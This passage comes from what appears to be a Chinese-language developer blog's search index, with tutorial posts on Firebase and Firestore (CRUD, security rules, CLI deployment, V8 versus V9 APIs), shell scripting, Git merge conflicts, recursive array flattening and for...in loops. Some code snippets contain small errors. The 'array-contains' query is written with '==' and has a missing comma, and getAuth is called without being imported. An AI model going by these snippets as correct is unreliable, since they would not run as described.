不要顯示任何東西，等到初始化完後再顯示正確的畫面即可，這邊就不示範了。","link":"/2022/07/18/firebase-authentication/"},{"title":"Firebase 基礎","text":"前端神器之一。 簡介附註：跟操作相關的文件可以參考這裡 Firebase 是 google 提供的一個服務，它讓前端開發者能夠用更簡單的方式來建立「資料庫相關」的後端應用。 它提供了不少服務，參考下面這張圖： 用紅線框起來的部分就是 Firebase 提供的服務，以前端來說很常會用到的有 Authentication 和 Firestore / Realtime Database。 Firestore / Realtime 這兩個資料庫（都是 NoSQL）的差別在於一個是新的，一個是舊的。 基本上新的會比較好上手，所以會目前比較常見的是 Firestore，這篇也會拿它來舉例。 另外做個補充，因為是 NoSQL 的關係，所以跟有些術語跟一般的 SQL 不同，我簡單列幾個： DB -&gt; Table -&gt; Row（SQL） DB -&gt; Collection -&gt; Document（NoSQL） 基本配置在你建立好專案跟資料庫以後，就要回到前端的部分來把 React 跟 Firebase 串接起來。 附註：Firebase 目前最新版本是 9，但 8 跟 9 的寫法有些不同，想知道差異的話可以參考 這篇，但總之這邊會以 8 為主。 首先先安裝 Firebase 依賴項目： 1npm install firebase @8.5 接著設定 config： 123456789101112131415161718import firebase from 'firebase/app'import 'firebase/firestore'const firebaseConfig = { apiKey: '...', authDomain: '...', projectId: '...', storageBucket: '...', messagingSenderId: '...', appId: '...'}// init firebasefirebase.initializeApp(firebaseConfig)// init firestoreconst db = firebase.firestore()export { db } 雖然只是個設定檔，但我想稍微解釋一下每一段 code 的含義，不然你複製貼上後也不知道這在幹嘛。 import firebase from \"firebase/app\" 這個是 Firebase 的核心程式，就跟 babel 會有個 babel/core 一樣，所以一定要把他先引進來。 import \"firebase/firestore\" 前面有說過 Firebase 有提供多種服務，這裡我們要用的是 firestore 這個「資料庫」，所以我們得把這項服務給引入進來。 反之，如果你之後想用其他的服務也是透過這種 firebase/*** 的方式來引入。 const firebaseConfig = {...} 這個就是你在 Firebase 的主控台中會列給你的設定檔，如果忘記的話隨時都可以回去看。 firebase.initializaApp(firebaseConfig) 做一個初始化的動作，可以想成是跟 firebase 做連線的意思。 const db = firebase.firestore() 我們要用的是 firestore 這項服務，所以這邊也要把對它做初始化。 export { db } firestore 初始化後會回傳一個 Object，簡單來說可以想成是資料庫的 instance，之後要做任何資料的存取都得透過它，所以這邊要把他 export 出去。 懶人包 db.collection(...).get() 取得所有 document db.collection(...).doc(...).get() 取得單一個 document db.collection(...).add(doc) 新增一筆 document db.collection(...).doc(...).update() 修改一個 document（部分修改） db.collection(...).doc(...).update({[fieldName]: filedValue.arrayUnion(data)}) 修改 document（陣列） db.collection(...).doc(...).delete() 刪除一個 document db.collection(...).doc(...).set() 修改一個 document（整筆覆寫） db.collection(...).doc(...).onSnapshot(onNext, onError) 取得即時資料（document） db.collection(...).onSnapshot(onNext, onError) 取得即時資料（collection） db.collection(...).where('key', 'operator', 'value') 設定 query db.collection(...).orderBy('key', 'desc') 排序 附註： operator 可以填的值能參考官方文件 讀取資料123456789101112131415161718192021useEffect(() =&gt; { setIsPending(true) db.collection('recipes') .get() .then((snapshot) =&gt; { if (snapshot.empty) throw new Error('Can not load any recipe...') const recipes = [] snapshot.forEach((doc) =&gt; recipes.push({ id: doc.id, ...doc.data() }) ) setData(recipes) setIsPending(false) }) .catch((error) =&gt; { setError(error.message) setIsPending(false) })}, []) 稍微解釋一下每一段 code 的用途： db.collection('recipes').get() 透過 .get() 來讀取想要的 collection（非同步） .then(snapshot =&gt; ...) 成功的話會拿到 snapshot，內容如下： snapshot.forEach(doc =&gt;...) 這邊要特別注意 docs 並不是我們實際要的資料而是 Firebase 的一些東西，所以實際上要先遍歷 docs 陣列，然後再把每個 doc 透過 .data() 來取出資料，所以這邊才會這樣寫。 這邊順便附上每個 doc 的內容： 總之這樣子就可以拿到資料了。 讀取資料（單筆）12345678910111213141516const { id } = useParams()useEffect(() =&gt; { setIsPending(true) db.collection('recipes') .doc(id) .get() .then((doc) =&gt; { setIsPending(false) if (!doc.exists) throw new Error('Can not found that recipe') setRecipe(doc.data()) }) .catch((error) =&gt; { setIsPending(false) setError(error.message) })}, []) 原本是 db.collection().get()，現在只是在前面多加一個 doc(id) 來指定要哪一個 document。 新增資料1234567891011121314151617181920212223const addNewRecipe = (e) =&gt; { e.preventDefault() setLoading(true) // 要送過去的資料 const doc = { title, ingredients, method, cookingTime } // add(doc) db.collection('recipes') .add(doc) .then(() =&gt; { setLoading(false) resetState() history.push('/') }) .catch((error) =&gt; { setLoading(false) setError(error.message) })} 這個還蠻直接的，就是用 add 來新增這樣。 刪除資料123const deleteRecipe = (id) =&gt; { db.collection('recipes').doc(id).delete()} 就一行而已，不解釋。 修改資料1234567891011121314151617181920const updateRecipe = (e) =&gt; { e.preventDefault() setLoading(true) db.collection('recipes') .doc(id) .update({ title, ingredients, method, cookingTime: cookingTime + ' minutes' }) .then((response) =&gt; { setLoading(false) console.log('succuss', response) }) .catch((error) =&gt; { setLoading(false) console.log('failed', error.message) })} Firebase 的機制是你傳什麼就改什麼，不會去動到其他欄位。例如說我只有傳 title 的話，那 ingredients、method 和 cookingTime 都會保留下來，不會被覆寫。 Real-Time collectionFirebase 有提供一種取得「即時資料」的方法，叫做 onSnapshot，直接來看 code： 1234567891011121314151617181920212223242526useEffect(() =&gt; { setIsPending(true) // 設定 listener const unsubscribe = db.collection('recipes').onSnapshot( (snapshot) =&gt; { if (snapshot.empty) throw new Error('Can not load any recipe...') const response = [] snapshot.forEach((doc) =&gt; { response.push({ id: doc.id, ...doc.data() }) }) setRecipes(response) setIsPending(false) }, (error) =&gt; { setError(error.message) setIsPending(false) } ) return () =&gt; { console.log('unsubscribe real time collection') unsubscribe() }}, []) 先介紹 onSnapshot 的部分。他會接收 onNext 和 onError 兩個參數，兩個都是 callback function，簡單來說就是「當資料改變時，幫我取得最新的資料。成功的話執行 onNext，失敗的話執行 onError，夠直覺吧！ 所以只要把成功 &amp; 失敗時要做的事情當作 function 傳入就可以達到「real time data」的效果，不管你是從網頁裡的刪除，還是直接到 firebase 刪除，都會自動幫你 trigger onSnapshot。 最後要注意一點是 clean function 的部分。 為了避免當離開元件時還一直在追蹤最新資料，所以必須利用 clean function 來把這個 listener 給清除掉。 清除的方法很間單，在執行 onSnapshot 時會有一個回傳值，是一個 function，這個 function 就是拿來解除 listener 用的，所以我們只需要在 clean function 中去執行它就可以啦！ Real-Time document既然可以 real-time collection，那有什麼道理不能 real-time document？ 12345678910111213141516171819202122useEffect(() =&gt; { setIsPending(true) const unsubscribe = db .collection('recipes') .doc(id) .onSnapshot( (snapshot) =&gt; { setIsPending(false) if (!snapshot.exists) throw new Error('Can not found that recipe') setRecipe(snapshot.data()) }, (error) =&gt; { setIsPending(false) setError(error.message) } ) return () =&gt; { console.log('unsubscribe real time document') unsubscribe() }}, [id]) Timestamp為了在往後拿資料時可以做「排序」，我們通常會在新增 document 的時候附帶「時間戳」的值。 這個時間戳的值不可以直接用 new Date 來存，而是得用 Firebase 提供的 method 來幫建立正確的格式，這樣他才有辦法排序。 這邊會用到一個叫做 Timestamp 的東西來建立時間戳。 首先到 config.js 新增這一段： 123456789101112131415161718import firebase from \"firebase/app\";import \"firebase/firestore\"import \"firebase/auth\"const firebaseConfig = { ...}// init firebasefirebase.initializeApp(firebaseConfig)// init servicesconst db = firebase.firestore()const auth = firebase.auth()// 加上這一個const timestamp = firebase.firestore.Timestampexport { db, auth, timestamp } 接著當要新增時，只要用這種方式就可以了： 1234const ref = db.collection('collection')ref.add({ createdAt: timestamp.fromDate(new Date())}) 順道一提，如果是想把 Firebase 的日期轉成 JS 物件後再格式化輸出，可以用 toDate 的方式： 12// 假設 dueDate 是 Firebase 的日期物件console.log(projects[0].dueDate.toDate().toDateString()) 比較特別的 query這邊只是想補充一下 query 的部分，一般來說基本的用法是這樣： 1db.collection('projects').where('category', '==', 'A') 用看的應該可以看出來我們要找的是「projects 中 category 為 A」的資料，所以代表資料是這樣： 1234{ ...others, category: 'A',} 可是假設現在資料中有個地方是長這樣子的話，該怎麼做才行： 12345678910{ ...others, assignedUsers: [ { id: 'DGunlfrsbhfIsS3xhxdpR4mR7uq2' displayName: 'PeaNu', photoURL: 'https://photo.com/user/1' } ]} 這時候你去查 文件 會告訴你說可以用 array-contains 來處理，不過要注意官方的提供範例是「array of value」，而不是「array of object」。 所以如果要用這種方法的話，就必須在 where(key, 'array-contains', value) 的 value 值填入「整個物件」，以上面的例子的來說就會這樣寫： 12345db.collection('projects').where('assignedUsers', '==', { id: 'DGunlfrsbhfIsS3xhxdpR4mR7uq2' displayName: 'PeaNu', photoURL: 'https://photo.com/user/1'}) 講成中文就是「把 assignedUsers 這個 array 裡包含這個 Object 的資料拿出來」，這就是這邊下 query 的方式，只是想補充一下，因為這比較特別一些。","link":"/2022/07/04/firebase-basic/"},{"title":"Firbase－設定 Rules","text":"好東西不解釋。 簡述在已經知道 Firebase 基礎 後，這篇要來談談「權限機制」。 簡單來說，目前的我們都還沒有做任何「Rule」設定，代表任何人都可以對 collection &amp; documents 做 Read &amp; Write 的動作，這顯然是一個很大的資安問題。 因此這篇要來紀錄「怎麼設定權限」這件事。 預設的規則打開你 Firestore 的主控台，應該會看到一個 Tab 是「規則」，點下去後該會看到這段 code： 123456789rules_version = '2';service cloud.firestore { match /databases/{database}/documents { match /{document=**} { allow read, write: if request.time &lt; timestamp.date(2022, 7, 25); } }} 這邊一行一行來解釋每段的意思。 1. rules_version = '2' 沒什麼，就是目前使用的版本是幾號。 2. service cloud.firestore 這個規則是給哪個 sevice 用的？這邊是 firestore 所以就填 firestore，如果是其他的 service 就會是其他的值。 3. match /databases/{database}/documents {...} 這個簡單來說就是「databases 底下的任何資料庫的 documents」都會套用 {...} 中的設定，{database} 跟萬用字元的意思差不多。 4. match /{document=**} {...} 跟上面一樣，任何{document=**} 都會套用 {...} 中的設定。 5. allow read, write: if ... 這邊就是正式的規則了，可以 read 和 write，然後在 timestamp.date(2022, 7, 25) 這個時間點以前。 所以這一整段的規則就是： 在 2022/07/25 之前，任何人對 firestore 底下的任何 database、任何 documents，都具有 read 和 write 權限（換言之就是大放送）。 設定規則先說一下基本的權限有： write（直接包含 create、delete、update 的意思） create delete update 接著來看 code 解釋： 123456789rules_version = '2';service cloud.firestore { match /databases/{database}/documents { match /recipes/{document=**} { allow create: if request.auth != null allow read, delete: if request.auth.uid == resource.data.uid } }} 1. match /recipes/{document=**} 這邊要設定的規則是給 recipes 這個 collection 用的，所以加上指定的路徑。 2. allow create: if request.auth != null 條件一：「使用者必須登入才可以 create」 簡單來說 request 底下有一個 auth 物件，這個物件就是我們每次發 request 時 Firebase 要拿來驗證的「JWT」，如果這個 JWT 不合法或是不存在，那就會驗證失敗，反之亦然。 所以這邊在做的就是確人 auth 是否有值？只有在有值的情況下才允許他 create。 3. allow read, delete: if request.auth.uid == resource.data.uid 條件二：「使用者只能 read 和 delete 自己的資料」 剛有說過 auth 就代表 JWT，所以可以用 .uid 的方式來辨別身份。接著 resource 的部分其實就是指存資料庫裡的資料。 一般來說在存資料時我們會額外添加一個 uid 來表示這個資料是誰的？所以在這邊就可以利用它來判斷這筆資料是不是 xxx 的？唯有符合條件時才允許他 read 和 delete。 以上就是基本的權限設置，一旦沒有遵循這個規則，那就沒有辦法做 CRUD 的動作，Firebase 會直接擋下來。 總之這是蠻好用的功能，我覺得很值得學習。","link":"/2022/07/15/firebase-rules/"},{"title":"Firebase-Tools","text":"簡稱 CLI。 簡述如果想要在本地端設定 Firebase 的規則，或者是部署到 Firebase 上，都會需要透過「Firebase-tools」這個 CLI 工具來幫忙，所以這篇就簡單介紹一些流程。 懶人包附註：這邊用 Mac 可能會遇到權限問題，我的解法是到 ~/.config/configstore 把所有 firebase 相關的檔案都開啟「讀寫」權限，這樣就不會一直彈出權限問題了。 1. 安裝 firebase-tools (global) 1npm install -g firebase-tools 2. 登入 1firebase login 3. 初始化 選擇要使用的 firebase 功能： 123456789? Which Firebase features do you want to set up for this directory? Press Space to select features, then Enter to confirm your choices. (Press &lt;space&gt; to select, &lt;a&gt; to toggle all, &lt;i&gt; to invert selection, and &lt;enter&gt; to proceed)ance ◉ Firestore: Configure security rules and indexes files for Firestore ◯ Functions: Configure a Cloud Functions directory and its files❯◉ Hosting: Configure files for Firebase Hosting and (optionally) set up GitHub Action deploys ◯ Hosting: Set up GitHub Action deploys ◯ Storage: Configure a security rules file for Cloud Storage ◯ Emulators: Set up local emulators for Firebase products 選擇初始化方案： 12345? Please select an option:❯ Use an existing project Create a new project Add Firebase to an existing Google Cloud Platform project Don't set up a default project 你要用 firebase 上的哪個專案？ 1234? Select a default Firebase project for this directory: cooking-peanu (Cooking PeaNu)❯ mymoney-2a81c (myMoney) uber-eats-clone-112b1 (uber-eats-clone) 你要用哪個檔案來設定 Rules？我們沒有所以直接 Enter 讓他自動建立： 123456? What file should be used for Firestore Rules? firestore.rulesFirestore indexes allow you to perform complex queries whilemaintaining performance that scales with the size of the resultset. You can keep index definitions in your project directoryand publish them with firebase deploy. 你要用哪個檔案來設定 indexs？我們沒有所以直接 Enter 讓他自動建立： 1? What file should be used for Firestore indexes? firestore.indexes.json 要 public 出去的資料夾名稱？這邊就要自行輸入了，因為 React 打包後會放到 build，所以這邊輸入 build： 1What do you want to use as your public directory? (public) 輸入 build 要設定成 SPA 嗎？（統一指向 index.html） 1? Configure as a single-page app (rewrite all urls to /index.html)? (y/N) 要不要自動部署到 Github 上？這裡看個人，我是選「N」 1? Set up automatic builds and deploys with GitHub? (y/N) 部署1. 建立 bundle 後的檔案 1npm run build 2. 下指令 1firebase deploy 就是這麼簡單。 另外，如果只是要部署一些 Firebase 的設定檔可以這樣做： 1234// firestorefirebase deploy --only firestore// storgaefirebase deploy --only storage 以上就是基本的使用方式。","link":"/2022/07/06/firebase-tools-usage/"},{"title":"Firebase－V8 與 V9 的超級比一比","text":"Different Style. 重點V8 跟 V9 最大的差別在於「模組化」，在 V8 中我們通常是直接把整個 firebase 物件拿出來使用，像是： firebase.firestore firebase.auth() But，在 V9 裡面把每個東西都變成了「模組」，意思就是你要想什麼功能就拿什麼出來用，像是： import { getFirestore } from 'firebase/firestore' import { createUserWithEmailAndPassword } from \"firebase/auth\" 據說 V9 這樣的效能會比較好，因為 bundle 後的體積會比較小一點。 初始化設定V8： 1234567891011121314151617181920212223import firebase from 'firebase/app'import 'firebase/firestore'const firebaseConfig = { apiKey: '...', authDomain: '...', projectId: '...', storageBucket: '...', messagingSenderId: '...', appId: '...'}// init firebasefirebase.initializeApp(firebaseConfig)// init servicesconst db = firebase.firestore()const auth = firebase.auth()const storage = firebase.storage()const timestamp = firebase.firestore.Timestampconst filedValue = firebase.firestore.FieldValueexport { db, auth, timestamp, storage, filedValue } V9： 123456789101112131415161718192021// 需引入相關模組import { initializeApp } from 'firebase/app'import { getFirestore } from 'firebase/firestore'const firebaseConfig = { apiKey: '...', authDomain: '...', projectId: '...', storageBucket: '...', messagingSenderId: '...', appId: '...'}// init firebaseinitializeApp(firebaseConfig)// init serviceconst db = getFirestore()const auth = getAuth()export { db, auth } 讀取 collectionV8： 1234567891011121314151617181920import { db } from '../firebase/config'useEffect(() =&gt; { db.collection('books') .get() .then((snapshot) =&gt; { if (snapshot.empty) throw new Error('This collection is empty') const result = [] snapshot.forEach((doc) =&gt; { result.push({ id: doc.id, ...doc.data() }) }) setBooks(result) }) .catch((error) =&gt; { console.log('ERROR', error.message) })}, []) V9： 123456789101112131415161718192021222324// 需引入相關模組import { db } from '../firebase/config'import { collection, getDocs } from 'firebase/firestore'useEffect(() =&gt; { // 這裡不一樣 const ref = collection(db, 'books') // 這裡不一樣 getDocs(ref) .then((snapshot) =&gt; { if (snapshot.empty) throw new Error('This collection is empty') const result = [] snapshot.forEach((doc) =&gt; { result.push({ id: doc.id, ...doc.data() }) }) setBooks(result) }) .catch((error) =&gt; { console.log('ERROR', error.message) })}, []) Real-Time DataV8： 123456789101112131415161718192021222324252627282930import { db } from '../firebase/config'export default function Home() { const [books, setBooks] = useState(null) useEffect(() =&gt; { const unsubscribe = db.collection('books').onSnapshot({ next: (snapshot) =&gt; { const result = [] snapshot.docs.forEach((doc) =&gt; { result.push({ ...doc.data(), id: doc.id }) }) setBooks(result) }, error: (error) =&gt; console.log(error.message) }) return () =&gt; unsubscribe() }, []) return ( &lt;div className='App'&gt; {books &amp;&amp; &lt;BookList books={books} /&gt;} &lt;BookForm /&gt; &lt;/div&gt; )} V9： 12345678910111213141516171819202122232425262728293031323334// 需引入相關模組import { db } from '../firebase/config'import { collection, getDocs, onSnapshot } from 'firebase/firestore'export default function Home() { const [books, setBooks] = useState(null) useEffect(() =&gt; { // 這裡不一樣 const ref = collection(db, 'books') // 這裡不一樣 const unsubscribe = onSnapshot(ref, { next: (snapshot) =&gt; { const result = [] snapshot.forEach((doc) =&gt; { result.push({ id: doc.id, ...doc.data() }) }) setBooks(result) }, error: (error) =&gt; console.log(error.message) }) return () =&gt; unsubscribe() }, []) return ( &lt;div className='App'&gt; {books &amp;&amp; &lt;BookList books={books} /&gt;} &lt;BookForm /&gt; &lt;/div&gt; )} 新增 documentV8： 1234567891011121314import { db } from '../firebase/config'const handleSubmit = async (e) =&gt; { e.preventDefault() try { const addedDoc = await db.collection('books').add({ title: newBook }) console.log(addedDoc) setNewBook('') } catch (error) { console.log(error.message) }} V9： 123456789101112131415161718// 需引入相關模組import { db } from '../firebase/config'import { addDoc, collection } from 'firebase/firestore'const handleSubmit = async (e) =&gt; { e.preventDefault() const ref = collection(db, 'books') // 這裡不一樣 try { const addedDoc = await addDoc(ref, { title: newBook }) console.log(addedDoc) setNewBook('') } catch (error) { console.log(error.message) }} 刪除 documentV8： 12345import { db } from '../firebase/config'const handleClick = async (id) =&gt; { await db.collection.doc(id).delete()} V9： 123456789// 需引入相關模組import { db } from '../firebase/config'import { deleteDoc, doc } from 'firebase/firestore'const handleClick = async (id) =&gt; { // 這裡不一樣 const ref = doc(db, 'books', id) await deleteDoc(ref)} 更新 documentV8： 1234567import { db } from '../firebase/config'const handleUpdate = async (id) =&gt; { db.collection('books').doc(id).update({ price: 100 })} V9： 12345678910import { db } from '../firebase/config'import { updateDoc } from 'firebase/firestore'const handleUpdate = async (id) =&gt; { // 這裡不一樣 const ref = doc(db, 'books', id) await updateDoc(ref, { price: 100 })} 註冊V8： 123456789import { auth } from '../firebase/config'const handleSubmit = async () =&gt; { try { const response = await auth.createUserWithEmailAndPassword(email, password) } catch (error) { console.log(error.message) }} V9： 1234567891011121314// 需引入相關模組import { auth } from '../firebase/config'import { createUserWithEmailAndPassword } from 'firebase/auth'const handleSubmit = async (e) =&gt; { e.preventDefault() try { // 這裡不一樣 const response = await createUserWithEmailAndPassword(auth, email, password) console.log('success', response) } catch (error) { console.log(error.message) }} 登入V8： 1234567891011import { auth } from '../firebase/config'const handleSubmit = async (e) =&gt; { e.preventDefault() try { const response = await auth.signInWithEmailAndPassword(email, password) login(response.user) } catch (error) { console.log(error.message) }} V9： 123456789101112131415// 需引入相關模組import { auth } from '../firebase/config'import { signInWithEmailAndPassword } from 'firebase/auth'const handleSubmit = async (e) =&gt; { e.preventDefault() try { // 這裡不一樣 const response = await signInWithEmailAndPassword(auth, email, password) // client state login(response.user) } catch (error) { console.log(error.message) }} 登出V8： 123456import { auth } from '../firebase/config'const logout = async () =&gt; { await auth.signOut() setUser(null)} V9： 123456789// 需引入相關模組import { auth } from '../firebase/config'import { signOut } from 'firebase/auth'const logout = async () =&gt; { // 這裡不一樣 await signOut(auth) setUser(null)} Real-Time stateV8： 12345678910111213141516import { auth } from '../firebase/config'useEffect(() =&gt; { const unsubscribe = auth.onAuthStateChanged( (user) =&gt; { console.log('USER', user) setUser(user) unsubscribe() }, (error) =&gt; { console.log(error.message) setUser(null) unsubscribe() } )}, []) V9： 1234567891011121314151617181920// 需引入相關模組import { auth } from '../firebase/config'import { onAuthStateChanged } from 'firebase/auth'useEffect(() =&gt; { // 這裡不一樣 const unsubscribe = onAuthStateChanged( auth, (user) =&gt; { console.log('USER', user) setUser(user) unsubscribe() }, (error) =&gt; { console.log(error.message) setUser(null) unsubscribe() } )}, []) QueryV8： 123456789101112131415161718192021import { db } from '../firebase/config'useEffect(() =&gt; { let ref = db.collection('books') // 重點這一行 ref = ref.where('uid', '==', user.uid) const unsubscribe = ref.onSnapshot({ next: (snapshot) =&gt; { const result = [] snapshot.forEach((doc) =&gt; { result.push({ id: doc.id, ...doc.data() }) }) setBooks(result) }, error: (error) =&gt; console.log(error.message) }) return () =&gt; unsubscribe()}, [user.uid]) V9： 1234567891011121314151617181920212223// 需引入相關模組import { collection, onSnapshot, where, query } from 'firebase/firestore'import { db } from '../firebase/config'useEffect(() =&gt; { let ref = collection(db, 'books') // 重點這一行 ref = query(ref, where('uid', '==', user.uid)) const unsubscribe = onSnapshot(ref, { next: (snapshot) =&gt; { const result = [] snapshot.forEach((doc) =&gt; { result.push({ id: doc.id, ...doc.data() }) }) setBooks(result) }, error: (error) =&gt; console.log(error.message) }) return () =&gt; unsubscribe()}, [user.uid])","link":"/2022/07/09/firebase-v8-and-v9/"},{"title":"我的第一個 Shell Script","text":"第一次寫 shell script。 錯誤排除如果沒辦法正常執行的話，試試看： 1chmod +x 檔名.sh 接著再用 ls 查看訊息中是否有寫上 +x 的執行權限 語法基本 #! 後面接著是要用什麼「解譯器」來解譯的意思。所以 !#/bin/bash 的意思就是用 bash 這個解譯器來解譯。 # 註解 $0 shell script 的檔名 echo $? 檢查上一行指令的執行狀況（Debug）：0 代表正常，其他數字就代表不正常 運算 $((運算式)) 做運算式的寫法。例如：1 + 1。沒有這樣寫的話會印出純文字 變數 $變數名稱 ${變數名稱} 呼叫變數（請不要放在單引號內，不然會印出純文字） 變數名稱=值 賦值。等號兩端不可以有空白，值如果有含空白要記得用「引號」包住 unset 變數名稱 刪除變數 參數 $1 執行時傳入的參數，1 代表第一個，2 代表第二，以此類推 $@ 執行時傳入的所有參數 範例1234567891011121314151617181920# 建立變數name=\"Jim\"# 建立變數 + 賦值n=10m=5echo 運算結果：$((n+$m))# 檢查上一行指令echo \"查看指令是否正常執行：$?\"# 呼叫變數echo \"呼叫變數 name：${name}\"echo \"呼叫變數 name：$name\"# 刪除變數unset nameecho \"刪除後再呼叫變數 name：${name}\"# 參數echo \"檔名：$0\"echo \"參數1：$1\"echo \"參數2：$2\"echo \"所有參數：$@\"echo \"所有參數（無間隔）：$*\" 用變數儲存指令的輸出值例如說用 var=curl url 會發現變數沒辦法儲存回傳值。 如果變數要儲存的是「指令」的輸出結果，必須用 「`」 或是 $() 來包住： 12res=`curl --silent https://api.github.com/users/aszx87410`echo $res 12res=$(curl --silent https://api.github.com/users/aszx87410)echo $res 單引號跟反引號的差別12345cmd1=\"touch abc.txt\"cmd2=`touch cba.txt`$cmd1$cmd2 雙引號：使用雙引號表示的命令不會被立即執行，直到您使用 $ 解析它時才會執行。例如，在上面的示例中，當您使用 $cmd1 時，系統將執行 touch abc.txt 命令。 反引號：使用反引號表示的命令在定義時就會被立即執行，並將結果分配給變量。例如，在上面的示例中，當定義 cmd2 時，系統將執行 touch cba.txt 命令，並將結果分配給 cmd2 變量。因此您無需再使用 $ 解析變量，因為它已經在定義時執行。 簡單來說，如果希望在定義命令時就執行，您可以使用反引號；如果您希望在定義命令后才執行它，您可以使用雙引號。 sed -i 的用法sed -i 是一個很有用的命令，可以在 shell 中快速修改文件。它使用正則表達式對文件進行替換，並且可以在原始文件上進行修改，因此您不需要重新創建一個新文件。 例如，假設您有一個名為 “example.txt” 的文件，內容如下： 12This is a line of text.This is another line of text. 如果您希望將所有的 “This” 替換為 “That”，您可以使用以下命令： 1sed -i '' 's/This/That/g' example.txt 註一：sed -i 的 i 是代表我要直接對原本的檔案做修改，如果不加這個 flag 就會建立一個新的檔案。註二：只有 Mac 用戶才需要加上第一個空字串，因為 Mac 的 sudo 加上 -i 以後第一個參數是 &lt;extension&gt;，所以不加的話就會出問題。 該命令將執行正則表達式替換，並將原始文件 “example.txt” 替換為： 12That is a line of text.That is another line of text. 請注意，正則表達式的格式為：s/search_string/replace_string/g，其中 g 表示對整個文件進行全局替換。 備註其實這就很像是在寫另外一種程式語言而已，可以學的語法還有蠻多的，有興趣的話就參考下面的參考資料連結，都寫的蠻詳細的。 參考資料Shell Script 簡易筆記簡明 Linux Shell Script 入門教學","link":"/2021/12/16/first-shell-script/"},{"title":"解決 Git 中的衝突（Conflict）","text":"在 從資料夾來理解分支的概念 中我們已經介紹過分支的觀念，但也有提到一個「Conflict（衝突）」的概念，所以這篇會解釋一下什麼是衝突？以及如何解決衝突？ 衝突怎麼發生的？簡單來說，衝突指的就是「兩個人都改到同一個檔案的同一個地方」。 舉個例子： 假設有 A、B 分支，現在 PeaNu 在分支 A 改了 DDDDD 這個檔案的第 1 行，PPB 也剛好在分支 B 改了 DDDDD 這個檔案的第 1 行。 那當要合併時，你把自己想成是 Git，你覺得應該要相信 PeaNu 還是 PPB？ 很無解吧？所以這種時候 Git 沒辦法幫你自動處理，它只能無奈的跟你說：「PeaNu 在 DDDDD 檔案的第 1 行改了什麼，PPB 也在 DDDDD 檔案的第 1 行改了什麼。我不知道誰的才是對的，所以你們自己處理私人恩怨囉。」 這種時候就需要人工來處理，也就是俗稱的「解 Conflict」。 怎麼解決衝突？我們用一個例子來說明吧。 假設跟剛剛的例子一樣，但為了方便區分，這裡的兩條分支改成 PeaNu-branch 跟 PPB-branch。而 PeaNu 跟 PPB 都在各自的分支上改了 DDDDD 檔案的第一行： （這是 PeaNu 做的修改） 1234花生醬好吃！AAAAABBBBBCCCCC （這是 PPB 做的修改） 1234花生醬噁爛！AAAAABBBBBCCCCC 接下來我想要從 PeaNu-branch 把 PPB-branch 分支合併進來時，就跟前面說的一樣，Git 就會跟我哀號： 123UnMerged paths: (use \"git add &lt;file&gt;...\" to mark resolution) both modified: DDDDD.txt （意思就是說 PeaNu 跟 PPB 都改到 DDDDD 檔案的同個地方，所以你們自己決定要怎麼處理。） 所以這時候就要來「解 Conflict」。打開 DDDDD 檔案，你會看到這樣的內容： 12345678&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD（目前所在的分支，也就是 PeaNu-branch）花生醬好吃=======花生醬噁爛&gt;&gt;&gt;&gt;&gt;&gt;&gt; PPB-branch（另一個分支）AAAAABBBBBCCCCC （======= 之前的部分代表 PeaNu 更改的內容，======= 之後的部分代表 PPB 更改的內容。） 這個時候你就要自己決定你想採用誰的內容。你可以選擇留下「花生醬好吃」；也可以選擇留下「花生醬噁爛」；或你也可以選擇「都不要留下」；甚至你也可以選擇「建立全新的內容」（例如：草莓醬萬歲）。 總而言之，最後你想怎麼選擇都看你自己。當你把發生衝突的地方給處理完畢後，接下來就可以繼續用 git commit -am 來完成這個合併的動作。 總結按照慣例我們來複習一下： 當兩個人在不同分支上修改同個檔案中的相同部分，就會引發 Conflict 解決 Confict 的辦法，是自己決定要採用什麼樣的內容 解決發生衝突的部分後，必須在執行一次 git commit -am 來完成合併的動作","link":"/2021/12/12/fix-the-conflict-of-git/"},{"title":"利用遞迴來回壓平陣列","text":"讓我豆頁痛的遞迴。 常犯的錯誤使用 join() 與 split()。 我一開始想到的也是這種作法，但後來才知道這種做法會有問題： 123456function flatten(arr) { return arr.join(',').split(',')}console.log(flatten([1, 2, 3])) // ['1', '2', '3']console.log(flatten([1, 2, 3, [1, 2], [3, 4], 5])) // ['1', '2', '3', '1', '2', '3', '4', '5']console.log(flatten([1, 2, 3, [1, [2]], [3, 4, [5]], 6])) // ['1', '2', '3', '1', '2', '3', '4', '5', '6'] （最後會變成字串是因為 join 會強制把元素轉成字串） 其實這個做法在大部分的情況下都沒有問題，唯獨在元素剛好是 「,」 的時候會出問題。 1234function flatten(arr) { return arr.join(',').split(',')}console.log(flatten(['1,', 2, 3])) // ['1', '', '2', '3'] 原因是因為： join 後會變成 =&gt; '1,,2,3' split 後會變成 =&gt; ['1', '', '2', '3'] 忘記這兩個的作用可以參考 陣列的內建函式 跟 跟字串有關的內建函式 所以這個方法對會出現逗號的 case 都無法使用。 正確的作法利用遞迴的概念來實作： 1234567891011121314151617181920212223function flatten(arr) { // 儲存壓平後的陣列 const result = [] // 遍歷陣列元素 arr.forEach(item =&gt; { // 如果元素是陣列，遞迴這個 function if(Array.isArray(item)) { // 呼叫自己 const flattenArray = flatten(item) // 把壓平後的陣列 push 回結果 flattenArray.forEach(item =&gt; result.push(item)) } else { result.push(item) } }) // 回傳結果 return result}console.log(flatten([1, 2, 3])) // [1, 2, 3]console.log(flatten([1, 2, 3, [1, 2], [3, 4], 5])) // [1, 2, 3, 1, 2, 3, 4, 5]console.log(flatten([1, 2, 3, [1, [2]], [3, 4, [5]], 6])) // [1, 2, 3, 1, 2, 3, 4, 5, 6]console.log(flatten(['1,', 2, 3])) // ['1,', 2, 3] 這題的思路是這樣子： 建立一個 result，用來儲存壓平後的陣列 遍歷傳入的 arr，如果元素不是陣列，直接推入 result 如果是陣列，再把它壓平 重點在於第三步的時候，你會想說「這不就是我正要做的事情嗎？」，所以會感到很疑惑。 但其實不用想的太複雜，你只要知道 flatten 這個 function 最後就是會回傳一個「壓平後的陣列」，所以直接給它呼叫下去就對了。不管這個過程會重複呼叫幾次 flatten，最後都一定會有盡頭（當元素不再是陣列的時候，就會被推到 result）。","link":"/2022/01/02/flatten-array/"},{"title":"for 迴圈的延伸 for...in 與 for...of","text":"學起來學起來。 懶人包 for...in 會輸出 key，通常用在 object（ES5） for...of 會輸出 value 只能用在 array（ES6） 兩者的差異12345678910const arr = [1, 2, 3, 4, 5, 6]// for...infor(let key in arr) { console.log(key) // '0', '1', '2', '3', '4', '5'}// for..offor(let value of arr) { console.log(value) // 1, 